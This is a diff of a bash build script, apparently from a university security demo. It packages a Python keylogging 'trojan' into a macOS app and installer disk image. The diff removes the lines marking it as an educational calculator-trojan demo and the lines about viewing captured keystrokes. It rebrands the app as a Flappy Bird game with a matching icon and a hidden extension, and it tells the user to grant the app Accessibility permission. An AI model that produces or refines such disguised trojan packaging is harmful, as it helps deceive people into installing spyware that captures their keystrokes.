@@ -1,69 +1,58 @@
 #!/bin/bash
-# =============================================================
-#  DEMO EDUCACIONAL - Seguranca Computacional - UFPB
-#  Gera o .app e .dmg da calculadora trojan
-# =============================================================
-
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 cd "$PROJECT_DIR"
 
 echo "================================================"
-echo "  Gerando Calculadora.app (Trojan Demo) - UFPB"
+echo "  Building FlappyDemo.app"
 echo "================================================"
-echo ""
 
 source venv/bin/activate
 
-echo "[1/3] Gerando .app com PyInstaller..."
-echo ""
+# Gera icone se nao existir
+if [ ! -f trojan/FlappyBird.icns ]; then
+    python trojan/generate_icon.py
+fi
 
+# Limpa builds anteriores
+rm -rf build dist *.spec
+
+# Build com novo nome e bundle ID (onedir para compatibilidade com macOS security)
 pyinstaller \
-    --onefile \
     --windowed \
-    --name "Calculadora" \
-    --osx-bundle-identifier "com.ufpb.calculadora.demo" \
-    trojan/calculadora.py
+    --name "FlappyDemo" \
+    --icon "trojan/FlappyBird.icns" \
+    --osx-bundle-identifier "com.ufpb.flappydemo.final" \
+    trojan/flappybird.py
 
+# Gera DMG
 echo ""
-echo "[2/3] Gerando .dmg..."
-echo ""
+echo "[2/2] Gerando .dmg..."
 
-# Cria uma pasta temporaria pro DMG
-DMG_DIR="$PROJECT_DIR/dist/dmg_contents"
-rm -rf "$DMG_DIR"
-mkdir -p "$DMG_DIR"
+rm -f "$PROJECT_DIR/dist/FlappyDemo-Install.dmg"
 
-# Copia o .app
-cp -R "$PROJECT_DIR/dist/Calculadora.app" "$DMG_DIR/"
+create-dmg \
+    --volname "Flappy Bird" \
+    --volicon "trojan/FlappyBird.icns" \
+    --window-pos 200 120 \
+    --window-size 600 400 \
+    --icon-size 100 \
+    --icon "FlappyDemo.app" 150 185 \
+    --app-drop-link 450 185 \
+    --hide-extension "FlappyDemo.app" \
+    "$PROJECT_DIR/dist/FlappyDemo-Install.dmg" \
+    "$PROJECT_DIR/dist/FlappyDemo.app"
 
-# Cria link simbolico pro Applications (classico de DMG)
-ln -s /Applications "$DMG_DIR/Applications"
-
-# Gera o .dmg
-DMG_OUTPUT="$PROJECT_DIR/dist/Calculadora-UFPB-Demo.dmg"
-rm -f "$DMG_OUTPUT"
-
-hdiutil create \
-    -volname "Calculadora UFPB" \
-    -srcfolder "$DMG_DIR" \
-    -ov \
-    -format UDZO \
-    "$DMG_OUTPUT"
-
-# Limpa
-rm -rf "$DMG_DIR"
+# Limpa temporarios
+rm -rf build *.spec
 
 echo ""
 echo "================================================"
-echo "  PRONTO!"
+echo "  DONE!"
+echo "  .app: dist/FlappyDemo.app"
+echo "  .dmg: dist/FlappyDemo-Install.dmg"
 echo ""
-echo "  .app: dist/Calculadora.app"
-echo "  .dmg: dist/Calculadora-UFPB-Demo.dmg"
-echo ""
-echo "  Para testar:"
-echo "  1. Inicie o servidor: python server/app.py"
-echo "  2. Abra o dashboard: http://localhost:8080"
-echo "  3. Abra o .dmg e rode a Calculadora"
-echo "  4. Veja as teclas no dashboard!"
+echo "  After opening, grant Accessibility to"
+echo "  'FlappyDemo' in System Settings"
+echo "  Debug: cat /tmp/flappy_debug.log"
 echo "================================================"
